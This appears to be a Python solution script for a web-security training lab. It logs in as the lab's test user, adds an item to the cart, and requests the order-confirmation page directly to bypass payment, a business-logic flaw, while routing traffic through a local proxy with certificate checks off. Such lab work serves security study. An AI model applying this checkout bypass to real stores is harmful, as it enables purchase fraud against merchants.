import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url, default="/cart/order-confirmation?order-confirmed=true"):
    headers = {'Referer':default}
    res = session.get(url, proxies=proxies, headers=headers, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def business_logic_exploit(session, url) :
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if 'Log out' in res.text :
        print("The wiener user has been logged in successfully!")
        
        cart_url = url + '/cart'
        csrf_token = get_csrf_token(session, cart_url)
        headers = {'Referer': url + '/product?productId=1'}
        data = {'productId':'1','redir':'PRODUCT','quantity':'1'}
        r = session.post(cart_url, data=data, headers=headers, verify=False, proxies=proxies)
        
        checkout_url = url + '/cart/checkout'
        data = {'csrf':csrf_token}
        r = session.post(checkout_url, data=data, allow_redirects=False, verify=False, proxies=proxies)
        
        if r.status_code == 302 :   
            confirm_url = url + '/cart/order-confirmation?order-confirmed=true'
            r = session.get(confirm_url, verify=False, proxies=proxies)

            if r.status_code == 200 :
                print("You have solved the lab successfully!")
            else :
                print("You failed to solve the lab!")
    else :
        print("Failed to log as wiener !")

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)